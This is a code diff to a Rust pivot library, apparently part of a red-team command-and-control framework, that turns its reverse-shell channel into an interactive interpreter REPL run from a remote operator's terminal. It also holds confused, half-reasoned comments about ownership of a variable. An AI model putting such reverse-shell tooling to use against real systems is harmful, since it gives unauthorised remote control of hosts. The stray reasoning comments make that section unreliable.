@@ -6,8 +6,12 @@ use alloc::vec::Vec;
 use eldritch_agent::Agent;
 use eldritch_core::{Interpreter, Value};
 use eldritch_macros::eldritch_library_impl;
-use pb::c2::{ReverseShellRequest, ReverseShellResponse};
+use pb::c2::{ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse};
 use transport::{ActiveTransport, Transport};
+
+use eldritch_repl::{Repl, ReplAction};
+use crossterm::{QueueableCommand, cursor, terminal};
+use std::io::{BufWriter, Write};
 
 #[eldritch_library_impl(PivotLibrary)]
 pub struct StdPivotLibrary {
@@ -46,6 +50,14 @@ use super::ssh_exec_impl;
 pub mod ssh_session;
 pub use ssh_session::Session;
 
+// Import local REPL modules
+pub mod repl {
+    pub mod parser;
+    pub mod terminal;
+}
+use repl::parser::InputParser;
+use repl::terminal::{VtWriter, render};
+
 #[derive(Debug)]
 struct ChannelPrinter {
     sender: std::sync::mpsc::Sender<ReverseShellRequest>,
@@ -54,8 +66,12 @@ struct ChannelPrinter {
 
 impl eldritch_core::Printer for ChannelPrinter {
     fn print_out(&self, _span: &eldritch_core::Span, val: &str) {
+        // We use \r\n for raw mode terminal
+        let s_crlf = val.replace('\n', "\r\n");
+        let display_s = alloc::format!("{s_crlf}\r\n");
+
         let _ = self.sender.send(ReverseShellRequest {
-            data: val.as_bytes().to_vec(),
+            data: display_s.as_bytes().to_vec(),
             task_id: self.task_id,
             kind: pb::c2::ReverseShellMessageKind::Data as i32,
             ..Default::default()
@@ -63,8 +79,11 @@ impl eldritch_core::Printer for ChannelPrinter {
     }
 
     fn print_err(&self, _span: &eldritch_core::Span, val: &str) {
+        let s_crlf = val.replace('\n', "\r\n");
+        let display_s = alloc::format!("{s_crlf}\r\n");
+
         let _ = self.sender.send(ReverseShellRequest {
-            data: alloc::format!("ERROR: {}", val).as_bytes().to_vec(),
+            data: display_s.as_bytes().to_vec(),
             task_id: self.task_id,
             kind: pb::c2::ReverseShellMessageKind::Data as i32,
             ..Default::default()
@@ -126,52 +145,134 @@ impl PivotLibrary for StdPivotLibrary {
             task_id: self.task_id,
         });
 
-        // Send initial banner/prompt
-        let _ = printer_tx.send(ReverseShellRequest {
-            data: "Eldritch REPL connected.\n>>> ".to_string().as_bytes().to_vec(),
+        // Initialize REPL state
+        let mut repl = Repl::new();
+        let stdout_writer = VtWriter {
+            tx: printer_tx.clone(),
             task_id: self.task_id,
-            kind: pb::c2::ReverseShellMessageKind::Data as i32,
-            ..Default::default()
-        });
+        };
+        let mut stdout = BufWriter::new(stdout_writer);
+
+        // Initial Render
+        let _ = render(&mut stdout, &repl, None);
+
+        let mut parser = InputParser::new();
+        let mut previous_buffer = String::new();
 
         // Run Loop
         for resp in loop_rx {
-            let cmd = String::from_utf8_lossy(&resp.data).to_string();
-
-            if cmd.trim() == "exit" {
-                break;
+            if resp.kind == ReverseShellMessageKind::Ping as i32 {
+                // Echo ping
+                let _ = printer_tx.send(ReverseShellRequest {
+                    kind: ReverseShellMessageKind::Ping.into(),
+                    data: resp.data,
+                    task_id: self.task_id,
+                });
+                continue;
+            }
+            if resp.data.is_empty() {
+                continue;
             }
 
-            match interp.interpret(&cmd) {
-                Ok(val) => {
-                    if let Value::None = val {
-                        // nothing
-                    } else {
-                        let _ = printer_tx.send(ReverseShellRequest {
-                            data: alloc::format!("{}\n", val).as_bytes().to_vec(),
-                            task_id: self.task_id,
-                            kind: pb::c2::ReverseShellMessageKind::Data as i32,
-                            ..Default::default()
-                        });
+            // Parse input
+            let inputs = parser.parse(&resp.data);
+            let mut pending_render = false;
+
+            for (i, input) in inputs.iter().enumerate() {
+                let action = repl.handle_input(input.clone());
+                match action {
+                    ReplAction::Render => {
+                        pending_render = true;
+                    }
+                    other => {
+                        if pending_render {
+                            let _ = render(&mut stdout, &repl, Some(previous_buffer.as_str()));
+                            previous_buffer = repl.get_render_state().buffer;
+                            pending_render = false;
+                        }
+
+                        match other {
+                            ReplAction::Quit => {
+                                // Handled below to restore printer
+                            }
+                            ReplAction::Submit { ref code, .. } => {
+                                // Move to next line
+                                let _ = stdout.write_all(b"\r\n");
+                                let _ = stdout.flush();
+
+                                // Execute
+                                match interp.interpret(code) {
+                                    Ok(v) => {
+                                        if !matches!(v, Value::None) {
+                                            // Print result
+                                            let s = alloc::format!("{:?}", v);
+                                            let s_crlf = s.replace('\n', "\r\n");
+                                            let _ = stdout.write_all(s_crlf.as_bytes());
+                                            let _ = stdout.write_all(b"\r\n");
+                                        }
+                                    }
+                                    Err(e) => {
+                                        let s = alloc::format!("Error: {}", e);
+                                        let s_crlf = s.replace('\n', "\r\n");
+                                        let _ = stdout.write_all(s_crlf.as_bytes());
+                                        let _ = stdout.write_all(b"\r\n");
+                                    }
+                                }
+                                let _ = render(&mut stdout, &repl, None);
+                                previous_buffer.clear();
+                            }
+                            ReplAction::AcceptLine { .. } => {
+                                let _ = stdout.write_all(b"\r\n");
+                                let _ = render(&mut stdout, &repl, None);
+                                previous_buffer.clear();
+                            }
+                            ReplAction::ClearScreen => {
+                                let _ = stdout.queue(terminal::Clear(terminal::ClearType::All));
+                                let _ = stdout.queue(cursor::MoveTo(0, 0));
+                                let _ = render(&mut stdout, &repl, None);
+                                previous_buffer = repl.get_render_state().buffer;
+                            }
+                            ReplAction::Complete => {
+                                let state = repl.get_render_state();
+                                let (start, completions) =
+                                    interp.complete(&state.buffer, state.cursor);
+                                repl.set_suggestions(completions, start);
+                                let _ = render(&mut stdout, &repl, None);
+                                previous_buffer = repl.get_render_state().buffer;
+                            }
+                            ReplAction::None => {}
+                            ReplAction::Render => unreachable!(),
+                        }
+
+                        // Check original action for Quit, which doesn't move value because match above was on other
+                        // Wait, `other` is moved into match above if not by ref?
+                        // `other` is consumed by match?
+                        // `ReplAction` is not Copy.
+                        // I need to clone or match differently.
+                        // Actually, I just matched `other`. It is consumed.
+                        // So I cannot use it in `matches!(other, ...)`.
+                        // I can just check inside the match arm for Quit.
+
+                        // BUT, I can't return easily from inside the match arm because `other` is local variable, not control flow of loop.
+                        // I can break the loop.
+                        // But I am inside `for input in inputs`.
+                        // If I return, I exit the function. That's fine.
+
+                        // So:
+                        if let ReplAction::Quit = other {
+                             // Restore printer
+                            interp.env.write().printer = old_printer;
+                            return Ok(());
+                        }
                     }
                 }
-                Err(e) => {
-                    let _ = printer_tx.send(ReverseShellRequest {
-                        data: alloc::format!("Error: {}\n", e).as_bytes().to_vec(),
-                        task_id: self.task_id,
-                        kind: pb::c2::ReverseShellMessageKind::Data as i32,
-                        ..Default::default()
-                    });
+
+                if i == inputs.len() - 1 && pending_render {
+                    let _ = render(&mut stdout, &repl, Some(previous_buffer.as_str()));
+                    previous_buffer = repl.get_render_state().buffer;
+                    pending_render = false;
                 }
             }
-
-            // Prompt
-            let _ = printer_tx.send(ReverseShellRequest {
-                data: ">>> ".to_string().as_bytes().to_vec(),
-                task_id: self.task_id,
-                kind: pb::c2::ReverseShellMessageKind::Data as i32,
-                ..Default::default()
-            });
         }
 
         // Restore printer
